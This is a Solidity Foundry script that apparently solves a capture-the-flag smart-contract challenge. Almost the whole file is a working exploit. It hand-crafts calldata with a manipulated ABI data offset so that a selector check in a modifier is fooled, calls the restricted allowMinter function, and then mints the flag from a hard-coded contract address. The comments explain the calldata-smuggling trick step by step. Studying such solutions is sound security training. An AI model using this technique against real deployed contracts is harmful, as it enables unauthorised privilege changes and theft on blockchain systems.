// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/ISeason2Challenge7.sol";

contract SolveS2C7 is Script {
    function run() external {
        address target = 0x9959a27Ad0eF8681C0DBAA9c44971F027e575aa6;

        vm.startBroadcast();

        // Step 1: Call allowMinter() by bypassing the modifier
        // We construct the calldata manually.

        bytes4 mintSelector = ISeason2Challenge7.mint.selector;
        bytes4 mintFlagSelector = ISeason2Challenge7.mintFlag.selector;
        bytes4 allowMinterSelector = ISeason2Challenge7.allowMinter.selector;

        // We want the 'data' offset (arg 0) to point to 96 (0x60).
        // Standard is 32 (0x20).
        // Offset 0 (4 bytes): mintSelector
        // Offset 4 (32 bytes): 0x60
        // Offset 36 (32 bytes): Garbage (ignored by decoder due to offset)
        // Offset 68 (32 bytes): Must contain mintFlagSelector at 68..71 checks.
        // We put mintFlagSelector padded.

        // Offset 100 (32 bytes): Length of data (4)
        // Offset 132 (32 bytes): Data content (allowMinterSelector)

        bytes memory maliciousCalldata = abi.encodePacked(
            mintSelector, // 0x00
            uint256(0x60), // 0x04: Offset to data (96 bytes from start of args) -> Points to 4+96=100
            uint256(0), // 0x24: Padding/Garbage
            bytes32(mintFlagSelector), // 0x44: Offset 68 contains mintFlagSelector! (Satisfies modifier)
            // This is technically "Data[0..31]" if offset was 32, but it's skipped by decoder.
            uint256(4), // 0x64 (Index 100): Length of data
            bytes32(allowMinterSelector) // 0x84 (Index 132): Data content
        );

        console.logBytes(maliciousCalldata);

        (bool success,) = target.call(maliciousCalldata);
        require(success, "Malicious call failed");

        // Step 2: Call mintFlag()
        // Standard call works because mint(mintFlag) puts mintFlag at offset 68 naturally.
        // Offset 0: mint
        // Offset 4: 0x20
        // Offset 36: 0x04
        // Offset 68: mintFlag...

        // The modifier checks calldatacopy(68, 4), which is mintFlag.
        // Inside mint, it executes mintFlag().
        // mintFlag checks minters[tx.origin]. We just set it in Step 1.

        ISeason2Challenge7(target).mint(abi.encodeCall(ISeason2Challenge7.mintFlag, ()));

        vm.stopBroadcast();
    }
}
